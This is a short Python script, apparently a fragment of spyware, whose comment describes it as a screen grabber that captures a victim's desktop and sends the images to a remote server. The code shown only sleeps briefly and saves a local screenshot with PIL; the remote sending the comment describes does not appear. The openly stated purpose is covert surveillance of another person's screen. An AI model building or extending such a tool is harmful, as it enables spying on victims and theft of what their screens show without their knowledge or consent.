#Screen grabber captures the victim's desktop and sends the images to a remote server.
#pip install pillow

from PIL import ImageGrab
import time
time.sleep(3)
ImageGrab.grab().save("screen_capture.jpg", "JPEG")
